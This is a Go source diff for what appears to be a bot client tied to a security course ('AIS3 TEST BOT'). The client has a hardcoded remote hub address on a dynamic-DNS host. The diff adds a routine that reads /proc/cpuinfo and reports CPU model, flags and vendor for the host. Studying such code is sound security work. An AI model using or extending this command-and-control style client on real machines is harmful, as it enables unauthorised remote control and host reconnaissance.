@@ -4,6 +4,8 @@ package main
 import (
 	"encoding/base64"
 	"runtime"
+	"strings"
+	"fmt"
 
 	kit "./lib/toolkit"
 	"./lib/base"
@@ -15,7 +17,41 @@ var hubAddr string = "cs8425.noip.me:8787"
 
 var proc int = runtime.NumCPU() + 2
 
+func initBot(c *base.Client) {
+	c.Info.Set("NumCPU", fmt.Sprintf("%v", runtime.NumCPU()))
+
+	lines, _ := kit.ReadLines("/proc/cpuinfo")
+	for _, line := range lines {
+		fields := strings.Split(line, ":")
+		if len(fields) < 2 {
+			continue
+		}
+		key := strings.TrimSpace(fields[0])
+		value := strings.TrimSpace(fields[1])
+
+		switch key {
+
+		case "model name", "Hardware":
+			// ARM : Hardware = Qualcomm Technologies, Inc MSM8939
+			// x86: model name = Intel(R) Core(TM) i7-4710HQ CPU @ 2.50GHz
+			c.Info.Set("ModelName", value)
+		case "flags":
+			flist := strings.FieldsFunc(value, func(r rune) bool {
+				return r == ',' || r == ' '
+			})
+			c.Info.Set("flags", strings.Join(flist, ","))
+
+
+		case "vendorId", "vendor_id", "Processor": // x86, x86, arm
+			// ARM : ARMv7 Processor rev 1 (v7l)
+			c.Info.Set("VendorID", value)
+		}
+	}
+}
+
 func main() {
+
+	base.RegInit(initBot)
 
 	c := base.NewClientM()
 	c.UUID = kit.HashBytes256([]byte("AIS3 TEST BOT"))
